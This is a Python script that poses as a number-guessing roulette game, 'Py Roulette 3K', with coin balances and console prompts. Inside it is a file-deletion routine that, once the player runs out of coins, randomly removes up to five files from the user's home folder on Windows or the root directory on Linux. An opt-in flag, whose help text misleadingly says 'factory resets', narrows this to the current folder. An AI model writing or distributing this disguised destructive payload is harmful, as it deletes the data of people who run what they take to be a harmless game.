import os, time, random, argparse, sys

username = os.getlogin()


parser = argparse.ArgumentParser(
    description="plzdont brick my goddamn pc ftlog"
)
parser.add_argument("--plzdontbrick", "-p", action="store_true", help="factory resets")
args = parser.parse_args()
if args.plzdontbrick:
    loser = True
else:
    loser = False


def delete_files_lol(dir_path, num_to_delete=5):
    try:
        allitems = os.listdir(dir_path)
    except FileNotFoundError:
        print(f"i didnt find it. sorry? try not to use {dir_path}")
        return
    except PermissionError:
        print(f"do you have {dir_path}'s permission? i think not.")
        return

    files = [
        item for item in allitems
        if os.path.isfile(os.path.join(dir_path, item))
    ]

    totalfilez = len(files)
    print(f"ooh, found {totalfilez} files!")

    if totalfilez == 0:
        print("cant.")
        return
    num_to_delete = min(num_to_delete, totalfilez)

    files_to_delete = random.sample(files, num_to_delete)

    print(f"you lost. sorry, will delete {num_to_delete} files.")        
    for file_name in files_to_delete:
        file_path = os.path.join(dir_path, file_name)
        try:
            os.remove(file_path)
            print(f"deleted {file_name} >:3")
        except OSError as e:
            print(f"failed to delete {file_name}, {e.strerror}")
    sys.exit(0)


def maingame():
    coins = 15000
    oss = sys.platform
    while True:
        if coins <= 0:
            if loser:
                
                current_folder = os.getcwd()
                if oss == "win32":
                    delete_files_lol(current_folder)
                elif oss == "linux":
                    delete_files_lol(current_folder)
                else:
                    pass
            else:
                if oss == "win32":
                    delete_files_lol(rf"C:\Users\{username}")
                elif oss == "linux":
                    delete_files_lol("/")

        input("Press enter to start roulette!")
        numbers_for_roulette = [99, 20, 94, 10, 67, 69, 13, 22, 45, 51, 63, 12, 90, 97]
        numbers_chosen = random.sample(numbers_for_roulette, 7)
        print(f"The numbers are chosen! These are the numbers:\n{numbers_chosen}")
        user_input = input("Insert the 7 numbers separated by spaces:\n> ")
        try:
            user_numbers = [int(num) for num in user_input.split()]
        except ValueError:
            print('not work')
            continue
        if user_numbers == numbers_chosen:
            input("Correct! You won!")
            coins += 2000
            print(f"Current balance: {coins} coins")
        else:
            print(f"Wrong! The correct sequence was: {numbers_chosen}")
            coins -= 2000
            print(f"Current balance: {coins} coins")



def main():
    print("Welcome to Py Roulette 3K!")
    input("press enter to start")
    maingame()


if __name__ == "__main__":
    main()